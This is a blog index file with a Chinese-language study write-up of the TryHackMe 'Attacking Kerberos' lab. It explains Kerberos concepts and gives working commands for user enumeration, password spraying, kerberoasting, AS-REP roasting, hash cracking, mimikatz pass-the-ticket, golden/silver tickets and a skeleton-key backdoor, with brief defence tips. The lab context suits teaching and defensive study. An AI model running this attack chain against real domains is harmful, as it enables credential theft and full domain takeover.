<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>kerberos攻击学习</title>
    <link href="/2023/09/17/kerberos%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/tryhackme_Attacking%20Kerberos%20room/"/>
    <url>/2023/09/17/kerberos%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/tryhackme_Attacking%20Kerberos%20room/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="kerberos攻击学习"><a href="#kerberos攻击学习" class="headerlink" title="kerberos攻击学习"></a>kerberos攻击学习</h1><p>这个房间主要介绍windows的票证授予服务kerberos的基础知识，以及如何攻击kerberos获得各类票据，甚至获得域管理员。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>kerberos是以windows域的一个身份认证服务，通过第三方票证授权的方式以及更强的加密来比NTLM更加安全。目前kerberos已经是windows域的默认身份认证服务，但是依然存在漏洞。</p><h3 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h3><ul><li><strong>TGT（Ticket Granting Ticket，票证授予票）</strong>：TGT可以看做是域认证的身份认证，相当于门票。通过身份认证后用户会获得TGT，只有拥有TGT后用户才可以向TGS请求域中特定服务的票证。</li><li><strong>KDC（Key Distribution Center，密钥分发中心）</strong>：密钥分发中心负责颁发TGT和服务票据，由<strong>身份验证服务</strong>和<strong>票据授予服务</strong>组成。</li><li><strong>AS（Authentication Service，身份验证服务）</strong>：身份验证服务发出TGT，供域中的TGS使用，以请求访问其他计算机和服务票证。</li><li><strong>TGS（Ticket Granting Service，票征授予服务）</strong>：票征授予服务在获取TGT后将票证返回到域中的计算机。</li><li><strong>SPN（Service Principal name，服务主体名称）</strong>：服务主体名称为服务实例提供标识符，<strong>将服务实例与域服务账户相关联</strong>。Windows要求服务具有与服务账户，这就是服务需要SPN集的原因。</li><li><strong>KDC LT Key（KDC Long Term Secret Key，KDC长期(加密)密钥）</strong>：这个KDC key（KDC LT Key）基于KRBTGT服务账户。用于<strong>加密TGT</strong>和为<strong>PAC</strong>证书签名。</li><li><strong>Client LT Key（Client Long Term Secret Key，客户端长期(加密)密钥）</strong>：客户端密钥基于计算机或者服务账户。用于加密时间戳和加密<strong>会话密钥（session key）</strong>。</li><li><strong>Service LT Key（Service Long Term Secret Key，服务长期(加密)密钥）</strong>：这个密钥（服务密钥）基于服务账户。用于加密服务票据和给对<strong>PAC</strong>进行数字签名。</li><li><strong>Session Key（会话密钥）</strong>:KDC在给用户发放TGT时会一同发放会话密钥，用户在请求服务票证时将TGT与会话密钥一同发送给KDC，用户在使用会话向服务证明并请求访问权限。</li><li><strong>PAC（Privilege Attribute Certificate，特权属性证书）</strong>：PAC保存用户的所有相关信息，它与TGT一起发送到KDC，由目标服务长期密钥（Servic LT Key）和KDC长期密钥（KDC LT Key）进行数字签名，以验证用户。</li></ul><h3 id="AS-REQ-x2F-预身份验证-细节"><a href="#AS-REQ-x2F-预身份验证-细节" class="headerlink" title="AS-REQ &#x2F; 预身份验证 细节"></a>AS-REQ &#x2F; 预身份验证 细节</h3><p>当用于向KDC请求TGT时，Kerberos身份验证中的AS-REQ步骤开始。为验证用户并创建TGT，KDC必须遵循确切的步骤。用户的第一步是加密计算出时间戳的NT散列值并将其发送到AS。KDC尝试使用用户提供的NT散列值来解密时间戳，如果成功，KDC将为用户颁发TGT以及会话密钥。（这里的NT hash即NTLM hash的简写）</p><p>附：NT Hash计算方式</p><blockquote><p>NT Hash计算过程相比LM Hash来得简单。</p><ul><li>1.转换为16进制</li><li>2.Unicode编码</li><li>3.MD4加密的16进制就是NT hash</li></ul></blockquote><h3 id="TGT-票据授予票-内容"><a href="#TGT-票据授予票-内容" class="headerlink" title="TGT(票据授予票)内容"></a>TGT(票据授予票)内容</h3><p>为了理解服务票据（service ticket）是如何创建和验证的，我们需要从票据的来源开始。用户将TGT提供给KDC，作为返回（回报），KDC将验证TGT并返回服务票据（service ticket）</p><p><img src="https://i.imgur.com/QFeXDN0.png"></p><h3 id="ST（Service-Ticket即TGS，服务票据）内容"><a href="#ST（Service-Ticket即TGS，服务票据）内容" class="headerlink" title="ST（Service Ticket即TGS，服务票据）内容"></a>ST（Service Ticket即TGS，服务票据）内容</h3><p>要理解kerberos身份验证是如何工作的，你首先要知道明白这些票据的内容和他们是如何验证的。服务票据包含两个部分：服务提供部分和用户提供部分。</p><ul><li>服务部分：用户详细信息、会话密钥；该票证使用服务账户的NTLM哈希加密。</li><li>用户部分：有效的时间戳、会话密钥；使用TGT会话密钥（TGT session key）加密。</li></ul><p><img src="https://i.imgur.com/kUqrVBa.png"></p><h3 id="Kerberos身份验证概述"><a href="#Kerberos身份验证概述" class="headerlink" title="Kerberos身份验证概述"></a>Kerberos身份验证概述</h3><p><img src="https://i.imgur.com/VRr2B6w.png"></p><p>AS-REQ 1. 客户端请求身份验证票据或票据授予票证（TGT）</p><p>AS-REQ 2. 密钥分发中心在身份验证后返回加密的TGT和会话密钥</p><p>AS-REQ 3. 客户端将加密的TGT发送到**票证授予服务器(TGS)**，其中包含客户端想要访问的服务的服务主体名称（SPN）</p><p>AS-REQ 4. 密钥分发中心（KDC）验证用户的TGT以及用户是否有权限访问该服务，然后向客户端发送该服务的有效会话密钥及票据</p><p>AS-REQ 5. 客户端请求服务并发送有效会话密钥以证明用户具有访问权限。</p><p>AS-REQ 6. 服务授予访问权限。</p><h3 id="kerberos票证概述"><a href="#kerberos票证概述" class="headerlink" title="kerberos票证概述"></a>kerberos票证概述</h3><p>在攻击kerberos的过程中，最常见的票证是票证授予票（TGT），这些票证可以有很多形式（后缀），例如Rubeus的<code>.kirbi</code>，Impacket的<code>.ccache</code>。最主要的还是<code>.kirbi</code>票证，这些票证通常是使用base64编码并可以用于各种攻击。TGT仅与KDC一起使用以获得服务票证。一但你提供TGT，服务器就会获取用户详细信息、会话密钥，然后使用服务账户的NTLM哈希对票证（TGT）进行加密。 </p><p>然后你的TGT会提供加密时间戳、会话密钥和加密过的TGT。然后KDC将验证TGT并返回所请求服务的服务票证。普通的TGT只能与连接到它的给定服务账户一起使用（白银票据），但是KRBTGT允许你获取所需的任何票证（黄金票据），从而允许访问你访问域上所需的任何内容。</p><h3 id="kerberos攻击权限要求"><a href="#kerberos攻击权限要求" class="headerlink" title="kerberos攻击权限要求"></a>kerberos攻击权限要求</h3><ul><li>kerbrute枚举-无需域访问</li><li>PTT（Pass The Ticket 传递票据）：以用户身份访问所需的域</li><li>kerberoasting：根据任何用户的需要进行访问</li><li>AS-REP Roasting（AS-REP烘焙）：根据任何用户的需要进行访问</li><li>金票：需要完整的域妥协（domain compromise）（域管理员）</li><li>银票：需要服务哈希</li><li>万能钥匙：需要完整的域妥协（域管理员）</li></ul><h2 id="使用kerbrute进行枚举——检测kerbrute中可利用账户"><a href="#使用kerbrute进行枚举——检测kerbrute中可利用账户" class="headerlink" title="使用kerbrute进行枚举——检测kerbrute中可利用账户"></a>使用kerbrute进行枚举——检测kerbrute中可利用账户</h2><p>kerbrute是一种流行的枚举工具，其原理是利用kerberos的<strong>预身份验证</strong>来暴力破解和枚举有效的活动目录（AD）用户。</p><p>在攻击前需要将DNS域名和计算机IP添加到攻击者计算机内的&#x2F;etc&#x2F;host中，否则攻击将不起作用。</p><p>以下笔记中使用的靶机IP和域控如下</p><p><code>10.10.58.156 CONTROLLER.local</code></p><h3 id="滥用预身份验证概述"><a href="#滥用预身份验证概述" class="headerlink" title="滥用预身份验证概述"></a>滥用预身份验证概述</h3><p>通过强制kerberos预身份验证不会触发账户登陆失败事件，但是可能会给触发设备告警，引起蓝队注意。通过kerberos暴力破解时，可以通过仅向KDC发送单个UDP帧来进行暴力破解，从预先提供好的字典里列举域上的用户。</p><blockquote><p>Kerbrute 安装 - </p><p>1.) 下载适用于您的操作系统的预编译二进制文件 - <a href="https://github.com/ropnop/kerbrute/releases">https://github.com/ropnop/kerbrute/releases</a></p><p>2.) 将 kerbrute_linux_amd64 重命名 为 kerbrute</p><p>3.) <code>chmod +x kerbrute</code> - 使 kerbrute 可执行</p></blockquote><h3 id="Kerbrute使用"><a href="#Kerbrute使用" class="headerlink" title="Kerbrute使用"></a>Kerbrute使用</h3><p>进入kerbrute目录后，准备好爆破用用户名字典，使用以下命令运行Kerbrute爆破域中存在的账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./kerbrute usernum --dc CONTROLLER.<span class="hljs-built_in">local</span> -d CONTROLLER.<span class="hljs-built_in">local</span> User.txt<br></code></pre></td></tr></table></figure><h2 id="使用Rubeus暴力破解-x2F-收割票证"><a href="#使用Rubeus暴力破解-x2F-收割票证" class="headerlink" title="使用Rubeus暴力破解&#x2F;收割票证"></a>使用Rubeus暴力破解&#x2F;收割票证</h2><p>Rubeus是用于攻击Kerberos的工具。Rubeus是kekeo工具的改编版，更加强大。Rubeus具有多种攻击方式和功能，包括跨越哈希（Overpass the hash&#x2F;Pass-the-Key），票证请求（Ticket Request）和票证延期（renewals），票证管理，票证提取，收获，传递票证（pass the ticket），AS-REP烘焙（AS-REP Roasting）和kerberoasting</p><h3 id="使用rubeus获取票证"><a href="#使用rubeus获取票证" class="headerlink" title="使用rubeus获取票证"></a>使用rubeus获取票证</h3><p>通过截获正在传递到KDC的票证并将其保存以用于其他攻击，例如PTT</p><p>攻击命令如下</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">Rubeus.<span class="hljs-keyword">exe</span> harvest /interva<span class="hljs-variable">l:30</span><br></code></pre></td></tr></table></figure><p>该命令告诉RUbeus每30s收集一次TGT</p><h3 id="使用Rubeus进行暴力破解密码-x2F-密码喷射"><a href="#使用Rubeus进行暴力破解密码-x2F-密码喷射" class="headerlink" title="使用Rubeus进行暴力破解密码&#x2F;密码喷射"></a>使用Rubeus进行暴力破解密码&#x2F;密码喷射</h3><blockquote><p>Rubeus 既可以暴力破解密码，也可以喷洒密码用户帐户。当暴力破解密码时，您可以使用单个用户帐户和密码单词列表来查看哪个密码适用于该给定用户帐户。在密码喷射中，您提供一个密码（例如Password1），然后对域中找到的所有用户帐户进行“喷射”，以查找哪些帐户可能拥有该密码。</p><p>此攻击将获取给定的基于 Kerberos 的密码，并将其喷洒到所有找到的用户上，并提供 .kirbi 票证。该票证是一个TGT，可用于从 KDC 获取服务票证，也可用于诸如传递票证攻击之类的攻击。</p></blockquote><p>在使用Rubeus进行密码喷洒之前，，需要将域控制器域名添加到windows的主机文件中。可以直接使用echo命令将IP和域名添加到计算机的主机文件中</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">echo <span class="hljs-number">10.01</span><span class="hljs-number">.147</span><span class="hljs-number">.97</span> CONTROLLER.<span class="hljs-keyword">local</span> &gt;&gt; <span class="hljs-name">C</span>:\Windows\System32\drivers\etc\hosts<br></code></pre></td></tr></table></figure><p>Rubeus喷洒密码命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Rubeus.exe brute <span class="hljs-regexp">/password:Password1 /</span>noticket<br></code></pre></td></tr></table></figure><p>以上命令将使用给定密码（上面命令中指定的是Password1）喷洒到所有找到的账户中，然后为该用户提供.kirbi TGT（即将上文中抓取到的TGT给现在爆破出来的用户使用）</p><p>ps：在进行像喷洒密码这种包里攻击时大概率会触发安全策略而导致账户锁定。</p><h2 id="使用Rubeus和Impacket进行kerberoasting"><a href="#使用Rubeus和Impacket进行kerberoasting" class="headerlink" title="使用Rubeus和Impacket进行kerberoasting"></a>使用Rubeus和Impacket进行kerberoasting</h2><p>这里将介绍kerberos中最流行的攻击之一——kerberoasting。kerberoasting允许用户请求具有注册SPN的任何服务的服务票证，然后使用该票证破解服务密码（服务账户）。如果一个服务有注册SPN，那么它是Kerberoastable的。但是攻击的成功取决于密码的强度、密码是否可追踪以及被破解的服务账户的权限。</p><p>要枚举Kerberoastable账户，建议使用BloodHound之类的工具来查找所有kerberoastable账户它允许你查看可以对哪些账户进行kerberoast（如果它们是域管理员），以及它们与域的其余部分有什么样的连接等等。</p><p>这里将使用Rubeus和Impacket进行攻击，同样的使用kekeo和Invoke-Kerberoast也能进行攻击。</p><h3 id="使用Rubeus进行Kerberoasting"><a href="#使用Rubeus进行Kerberoasting" class="headerlink" title="使用Rubeus进行Kerberoasting"></a>使用Rubeus进行Kerberoasting</h3><p>ps：以下操作是在内网机器上进行操作的。</p><p>以下命令将转储任何kerberoastable用户的Kerberos哈希值</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Rubeus</span>.</span></span>exe kerberoast<br></code></pre></td></tr></table></figure><p><img src="https://i.imgur.com/XZegVqf.png"></p><p>将获得的hash储存到本地的.txt文件中，然后使用hashcat破解它。</p><p>使用hashcat破解需要提前准备好密码字典</p><p>破解命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">13100</span> -a <span class="hljs-number">0</span> hash.txt password.txt<br></code></pre></td></tr></table></figure><h3 id="使用Impacket进行kerberoasting"><a href="#使用Impacket进行kerberoasting" class="headerlink" title="使用Impacket进行kerberoasting"></a>使用Impacket进行kerberoasting</h3><blockquote><p>Impacket安装教程</p><p>自 0.9.20 以来，Impacket 版本一直不稳定，我建议安装 Impacket &lt; 0.9.20</p><p>1.)<code>cd /opt</code> 导航到您的首选目录以保存工具 </p><p><a href="https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19">2.) 从https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19</a>下载预编译包 </p><p>3.)<code>cd Impacket-0.9.19</code> 导航到 impacket 目录</p><p>4.) <code>pip install .</code>- 这将安装所有需要的依赖项</p></blockquote><p>Impacket使用命令</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/doc/</span>python3-impacket<span class="hljs-regexp">/examples /</span><span class="hljs-regexp">/进入GetUserSPNs.py所在位置</span><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sudo python3 GetUserSPNs<span class="hljs-selector-class">.py</span> controller<span class="hljs-selector-class">.local</span>(域名)/<span class="hljs-built_in">Machine1</span>(机器名称):<span class="hljs-built_in">Password</span>(密码) -dc-ip 目标机器IP -request<br></code></pre></td></tr></table></figure><p>↑这将转储它可以在目标域上找到的所有kerberoastable账户的kerberos哈希值，就像Rubeus所做的那样；但是与Rubeus不同的是它不用再目标机器上进行操作，并且可以远程完成。</p><p>破解hash步骤相同</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashcat</span> -m <span class="hljs-number">13100</span> -a <span class="hljs-number">0</span> hash.txt Pass.txt<br></code></pre></td></tr></table></figure><h3 id="获得服务账户后可以做什么？"><a href="#获得服务账户后可以做什么？" class="headerlink" title="获得服务账户后可以做什么？"></a>获得服务账户后可以做什么？</h3><p>破解服务账户的账号密码后有多种方式可以窃取数据和收集所需要的信息。具体取决于服务账户是否为域管理员，如果<strong>服务账户是域管理员，那么就相当于获取了类似金&#x2F;银票据的控制权</strong>，可以收集所需的数据和信息，例如转储NTDS.dit.</p><blockquote><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p></blockquote><p>如果服务账户不是域管理员，那么可以使用它登录其他系统并尝试进行提权。或者可以使用破解的密码来攻击其他服务和域管理员账户；许多公司可能会为其服务或域管理账户重复使用相同或者相似的密码。</p><h3 id="Kerberoasting防御方法"><a href="#Kerberoasting防御方法" class="headerlink" title="Kerberoasting防御方法"></a>Kerberoasting防御方法</h3><ul><li>设置强密码，如果服务账户的密码强，那么kerberoasting将无效</li><li>不将服务账户设置为域管理员，服务账户不需要是域管理员，不将服务账户设置为域管理员，那么kerberoasting攻击成功后的利用难度将增大，不会那么有效。</li></ul><h2 id="使用Rubeus进行AS-REP-roasting"><a href="#使用Rubeus进行AS-REP-roasting" class="headerlink" title="使用Rubeus进行AS-REP roasting"></a>使用Rubeus进行AS-REP roasting</h2><p>域kerberos roasting类似，AS-REP roasting 转储禁用了kerberos预身份验证的用户账户的krbasrep5 hash值。与Kerberoasting不同，这些用户不必是服务账户。对用户进行AS-REP roasting的唯一要求是用户禁用预身份验证。</p><p>这里将继续使用Rubeus，就像进行kerberosroasting和收获一样，Rubeus有一个简单且易于理解命令，可以在禁用kerberos预身份验证的情况下对AS-REP进行roasting和攻击用户。从Rubeus转储hash后，我们将继续使用hashcat来破解krbasrep5哈希值。</p><p>同样的，不止Rubeus可以进行AS-REP Roasting ，keko和impacket的GetNPUsers.py也行。不过Rubeus更易用，它会自动查找AS-REP Roastable用户，而使用GetNPUsers必须事先枚举用户并知道那些用户是AS-REP Roastable。</p><h3 id="AS-REP-Roasting-概述"><a href="#AS-REP-Roasting-概述" class="headerlink" title="AS-REP Roasting 概述"></a>AS-REP Roasting 概述</h3><p>在预身份验证期间，用户hash将用于加密时间戳，域控制器将尝试解密时间戳以验证是否正在使用正确的哈希并且不会重播先前的请求( the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request)。</p><p>验证时间戳后，KDC将为用户颁发TGT。如果禁用预身份验证，你可以请求任何复用的任何身份验证数据，并且KDC将返回一个可以离线破解的加密TGT，因为KDC会跳过验证用户真是身份步骤（可以伪装用户身份）</p><h3 id="使用Rubeus转储kerbasrep5哈希值"><a href="#使用Rubeus转储kerbasrep5哈希值" class="headerlink" title="使用Rubeus转储kerbasrep5哈希值"></a>使用Rubeus转储kerbasrep5哈希值</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Rubeus</span>.</span></span>exe aseproast<br></code></pre></td></tr></table></figure><p>以上命令将运行 AS-REP Roast 命令来查找易受攻击的用户，然后转储找到的易受攻击的用户哈希值。</p><p>获取hash后继续使用hashcat进行破解</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hashcat -m <span class="hljs-number">18200</span> hash<span class="hljs-selector-class">.txt</span> Passwd<span class="hljs-selector-class">.txt</span> <span class="hljs-comment">//Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </span><br></code></pre></td></tr></table></figure><blockquote><p>用 hashcat 破解这些哈希 - </p><p>1.) 将哈希值从目标计算机传输到攻击者计算机，并将哈希值放入 txt 文件中</p><p>2.) 在$krb5asrep$后面插入23$，这样第一行就是$krb5asrep$23$User…..</p><p>3.) <code>hashcat -m 18200 hash.txt Pass.txt</code> - 破解这些哈希值！Rubeus AS-REP 烘焙使用 hashcat 模式 18200 </p></blockquote><p><img src="https://i.imgur.com/eOqGVrm.png"></p><h3 id="AS-REP-Roasting预防措施"><a href="#AS-REP-Roasting预防措施" class="headerlink" title="AS-REP Roasting预防措施"></a>AS-REP Roasting预防措施</h3><ul><li>使用强密码，这将耗费更多时间用于hash破解</li><li>除非有必要，不要关闭kerberos预身份验证，除了打开预身份验证外，几乎没有颁发可以完全缓解这种攻击。</li></ul><h2 id="使用mimikatz进行传递票据（PTT-Pass-The-Ticket）"><a href="#使用mimikatz进行传递票据（PTT-Pass-The-Ticket）" class="headerlink" title="使用mimikatz进行传递票据（PTT,Pass The Ticket）"></a>使用mimikatz进行传递票据（PTT,Pass The Ticket）</h2><p>mimikatz属于后渗透利用工具，是非常流行且功能强大，最常用于活动目录网络内转储用户凭据，在这里我们将使用mimikatz从LSASS中转储TGT</p><h3 id="PTT-x2F-Pass-The-Ticket-概述"><a href="#PTT-x2F-Pass-The-Ticket-概述" class="headerlink" title="PTT&#x2F;Pass The Ticket 概述"></a>PTT&#x2F;Pass The Ticket 概述</h3><p>PTT通过从机器的LSASS内存中转储TGT。LSASS（Local Security Subsystem Servic，本地安全机构子系统服务）是一个内存进程，它将凭据储存在活动目录的服务器上，并且可以储存Kerberos票证以及其他凭据类型，以充当网守（gatekeeper）并接受或者拒绝所提供的凭据。攻击者可以从LSASS内存中转储kerberos票证，就像转储hash一样。</p><p>当使用mimikatz转储票证时，它会给我们一个.kirbi票证。如果域管理员票证位于LSASS内存中，则可以使用该票证获得域管理员。如果存在不安全的与服务账户票证，则此攻击对于权限提升和横向移动非常有用。</p><p>如果转储域管理员的票证，然后使用mimikatz PTT攻击模拟该票证，便可以通过该攻击升级为域管理员。PTT攻击的原理就是重用现有票证，并不会创建或者销毁任何票证，只是重用域中其他用户的现有票证并冒充该票证。</p><h3 id="mimikatz使用"><a href="#mimikatz使用" class="headerlink" title="mimikatz使用"></a>mimikatz使用</h3><p>cmd输入以下命令启动mimikatz（需要管理员权限）</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">mimikatz.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><p>输入一下命令来检查是否以管理员权限运行</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br></code></pre></td></tr></table></figure><p>如果正确，则输出[output ‘20’ OK]</p><p><img src="https://i.imgur.com/SJQGplV.png"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">sekulsa::ticket /<span class="hljs-keyword">export</span><br></code></pre></td></tr></table></figure><p>上面的命令会将所有的.kribi票证导出到当前目录中</p><blockquote><p>在此步骤中，您还可以使用我们之前从 Rubeus 获取的 Base 64 编码票证</p></blockquote><p>在导出的票证中寻到管理员票证，就如图中所示</p><p><img src="https://i.imgur.com/xC0L5Kf.png"></p><h3 id="使用mimikatz进行PTT"><a href="#使用mimikatz进行PTT" class="headerlink" title="使用mimikatz进行PTT"></a>使用mimikatz进行PTT</h3><p>我们现在已经准备好了飘逸，可以进行PTT攻击获得域管理员权限。</p><p>在mimikatz中执行以下命令</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">kerberos::ptt &lt;ticket&gt;<br></code></pre></td></tr></table></figure><p>上面的ticket是上文中转储的.kirbi票据的全称</p><p><img src="https://i.imgur.com/DwXmm8Z.png"></p><p>使用<code>klist</code>命令来列出缓存中票证以验证我们是否成功模拟票证</p><p><img src="https://i.imgur.com/GgxDm9k.png"></p><p>模拟成功，现在我们已经拥有了和域管理员相同的权力</p><p>可以查看管理员共享</p><p><img src="https://i.imgur.com/9nxjeTS.png"></p><h3 id="PTT攻击的防御方式"><a href="#PTT攻击的防御方式" class="headerlink" title="PTT攻击的防御方式"></a>PTT攻击的防御方式</h3><p>不要让域管理员登录到除了域控制器以外的任何东西。如果域管理员仍登录到一些低级别计算上，容易留下用于攻击和横向移动的票证。</p><h2 id="使用mimikatz进行金-x2F-银票据攻击"><a href="#使用mimikatz进行金-x2F-银票据攻击" class="headerlink" title="使用mimikatz进行金&#x2F;银票据攻击"></a>使用mimikatz进行金&#x2F;银票据攻击</h2><p>有些时候，在限制条件下银票比金票更合适，因为它更谨慎一些。如果<strong>隐身</strong>和<strong>不被发现</strong>很重要，那么银票可能是比金票更好的选择。但是创建票证的方法是完全相同的，两种票证的主要区别在于银票仅限于目标服务，而金票可以访问任何kerberos服务。</p><h3 id="KRBTGT概述"><a href="#KRBTGT概述" class="headerlink" title="KRBTGT概述"></a>KRBTGT概述</h3><p>为了理解这些攻击原理，首要要先了解KRBTGT和TGT之间的区别。KRBTGT是KDC的的服务账户，是向客户发送所有票证的密钥分发中心。</p><p>如果模拟此账户并从KRBTGT创建黄金票证，那么就可以为想要的任何内容创建服务票证。TGT是KDC办法的服务账户票证，只能访问TGT所属的服务，就像SQLService票证一样。</p><h3 id="金银票攻击概述"><a href="#金银票攻击概述" class="headerlink" title="金银票攻击概述"></a>金银票攻击概述</h3><p>金票攻击的工作原理是转储域中任何用户的票证授予票（TGT），这最好是域管理员。</p><p>但是对于金票，要转储的是krbtgt票，对于银票，要转储的是域管理员票。这将为你提供服务&#x2F;域管理员账户的SID或安全标识符（每个用户账户的唯一标识符）以及NTLM哈希，然后可以再mimikat黄金票据攻击中使用这些详细信息，以创建模拟给定服务账户信息的TGT。</p><h3 id="转储krbtgt哈希"><a href="#转储krbtgt哈希" class="headerlink" title="转储krbtgt哈希"></a>转储krbtgt哈希</h3><p>确保mimikatz是以管理员身份运行</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::lsa <span class="hljs-regexp">/inject /</span>name:krbtgt<br></code></pre></td></tr></table></figure><p>以上命令将转储hash以及创建金票据所需的安全标识符。</p><p>如果要创建银票，需要更改<code>/name:要转储的域管理员账户或者服务账户（例如 SQLService）</code>的hash</p><p><img src="https://i.imgur.com/VOEsU4O.png"></p><h3 id="创建金-x2F-银票"><a href="#创建金-x2F-银票" class="headerlink" title="创建金&#x2F;银票"></a>创建金&#x2F;银票</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Kerberos::golden /user:Administrator /domain:ontroller.local /sid: /krbtgt: /id:<br></code></pre></td></tr></table></figure><p>以上是创建金票的命令，创建银票只需要将服务NTLMhash放入krbtgt槽中，服务账户的sid放入sid，并将id更改为103</p><p>金票据创建实例图</p><p><img src="https://i.imgur.com/rh06qDl.png"></p><h3 id="使用金银票访问其他机器"><a href="#使用金银票访问其他机器" class="headerlink" title="使用金银票访问其他机器"></a>使用金银票访问其他机器</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">misc::cmd<br></code></pre></td></tr></table></figure><p>使用以上命令将在mimikatz中<strong>使用给定的票证</strong>打开一个新的提升命令提示符</p><p><img src="https://i.imgur.com/6HnEnwi.png"></p><p>访问你想要的计算机，你可以访问的内容取决于从票据中获取的用户权限。如果是从krbtgt中获取的票证，那么可以访问整个网络，因此称其为黄金票证。</p><p>然而，银票只能访问用户有权访问的内容，如果他是域管理员，那么几乎可以访问整个网络，但是提升成都比黄金票据稍低。</p><p><img src="https://i.imgur.com/BSh4rXy.png"></p><p>（如果域中没有其他计算机，此攻击将无法进行）</p><h2 id="使用mimiatz植入kerberos后门"><a href="#使用mimiatz植入kerberos后门" class="headerlink" title="使用mimiatz植入kerberos后门"></a>使用mimiatz植入kerberos后门</h2><p>除了使用金银票据维持访问权限以外，在攻击kerberos时，还可以使用mimikatz植入后门。kerberos的后门更加隐蔽，因为其类似于rootkit，将其自身植入域林中，允许自己使用主密码访问任何计算机</p><p>kerberos后门的工作原理是植入万能钥匙，该万能钥匙密码滥用AS-REQ验证加密时间戳的方式。万能密码仅适用于使用Kerberos RC4加密的情况。</p><p>ps：根据上文，执行此攻击需要获取域管理员权限。</p><blockquote><p>mimikatz 万能密钥的默认哈希值是 <em>60BA4FCADC466C7A033C178194C03DF6</em>，密码 是“ <em>mimikatz</em> ”</p></blockquote><h3 id="万能钥匙概述"><a href="#万能钥匙概述" class="headerlink" title="万能钥匙概述"></a>万能钥匙概述</h3><p>万能钥匙的工作原理是滥用AS-REQ加密时间戳。时间戳是使用用户NT hash进行加密的，然后域控制器尝试使用用户NT hash来解密此时间戳，一但植入万能钥匙，域控制器将尝试使用用户NT hash和万能钥匙NT hash来解密时间戳，从而允许攻击者访问域林。</p><h3 id="使用mimikatz安装万能钥匙"><a href="#使用mimikatz安装万能钥匙" class="headerlink" title="使用mimikatz安装万能钥匙"></a>使用mimikatz安装万能钥匙</h3><p>以管理员模式打开mimikatz</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">misc:</span>skeleton<br></code></pre></td></tr></table></figure><p>只需要上面一条命令即可</p><h3 id="进入域林"><a href="#进入域林" class="headerlink" title="进入域林"></a>进入域林</h3><p>默认凭据为：“ <em>mimikatz</em> ”</p><p>示例：<code>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz</code> - 现在无需管理员密码即可访问共享</p><p>示例：<code>dir \\Desktop-1\c$ /user:Machine1 mimikatz</code> - 访问 Desktop-1 的目录，而不知道哪些用户有权访问 Desktop-1</p><p>万能钥匙不会自行持久保存，因为它在内存中运行，可以使用其他工具和技术对其进行脚本化或持久保存。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在这个房间里，经历的kerberos攻击的基本流程，从枚举可利用账户开始，再到使用Rubeus进行密码爆破获得账户密码，最后再到使用使用mimikatz转储票据，进行金银票攻击，直至最后在域林中植入万能钥匙后门。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFD动态靶场搭建</title>
